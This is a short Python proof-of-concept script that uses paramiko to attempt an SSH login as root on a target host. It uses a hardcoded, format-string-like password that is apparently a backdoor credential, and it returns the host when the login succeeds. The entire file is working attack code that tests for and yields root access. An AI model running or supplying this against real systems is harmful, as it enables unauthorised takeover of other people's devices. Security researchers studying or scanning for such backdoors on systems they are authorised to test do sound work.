# -*- coding:utf-8 -*-
# author:nan3r

import sys
reload(sys)
sys.setdefaultencoding('utf-8')

import paramiko
# import Crypto

def poc(host):
	host = host[:host.find(":")]
	try:
		ssh_client = paramiko.SSHClient()
		ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh_client.connect(host, username="root", password="<<< %s(un='%s') = %u")
		return host
	# except paramiko.AuthenticationException as err:
	# 	if VERBOSE:
	# 		return "[!] Authentication failed to %s" % (host)
	# except paramiko.SSHException as err:
	# 	if VERBOSE:
	# 		return "[!] Failed to connect to %s: %s" % (host, err)
	except Exception as err:
		# if VERBOSE:
		# 	return "[!] Error connecting to %s: %s" % (host, err)
		return False